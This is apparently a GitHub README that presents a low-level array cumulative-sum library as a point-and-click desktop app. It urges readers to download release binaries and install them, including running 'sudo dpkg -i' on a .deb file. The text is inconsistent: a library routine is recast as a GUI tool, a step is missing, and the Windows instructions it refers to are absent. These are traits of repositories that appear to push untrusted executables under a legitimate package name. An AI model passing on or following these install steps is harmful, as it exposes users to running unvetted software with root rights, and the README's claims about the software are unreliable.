[![Download Now!](https://img.shields.io/badge/Download%20Now%21-link-blue)](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases)

## 📦 Introduction

Welcome to the **blas-ext-base-ndarray-scusumors** project! This application helps you compute the cumulative sum of one-dimensional single-precision floating-point arrays easily. It uses ordinary recursive summation to provide accurate results. You don’t need to have any programming experience to use it. This README will guide you step by step on how to download and run the software.

## 🚀 Getting Started

### Prerequisites

Before you begin, please ensure you have the following:

- A computer running Windows, macOS, or Linux.
- Basic familiarity with downloading files from the internet.
- A way to open files, such as WinRAR, 7-Zip, or your operating system's default file manager.

### Step 1: Visit the Download Page

To get the software, first, visit our [Releases page](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases). Here, you'll find the latest version of the application available for download.

### Step 2: Download the Application

On the Releases page, you will see a list of available versions. Look for the latest version (usually at the top). Click on it to open the details.

#### For macOS

1. Double-click the downloaded `.dmg` file.
2. Drag the application into the Applications folder.
3. Open your Applications folder and find the app to run it.

#### For Linux

1. If you downloaded a `.deb` file, open your terminal and run:
   ```
   sudo dpkg -i yourfilename.deb
   ```
   Replace `yourfilename.deb` with the actual file name.
2. If you downloaded a `.tar.gz` file, extract it using:
   ```
   tar -xzf yourfilename.tar.gz
   ```
   Then navigate to the folder and run the application.

### Step 4: Running the Application

After installation, you can run the application. 

1. Open the application from your Start menu (Windows), Applications folder (macOS), or through terminal commands (Linux).
2. You will see a simple interface where you can input your data.

### Step 5: Input Data

Input your one-dimensional single-precision floating-point array. This involves entering numbers separated by commas. For example, `1.0, 2.0, 3.0`. 

Once your data is entered, find the button labeled "Calculate Cumulative Sum" and click on it. The application will quickly compute the cumulative sum and display the result.
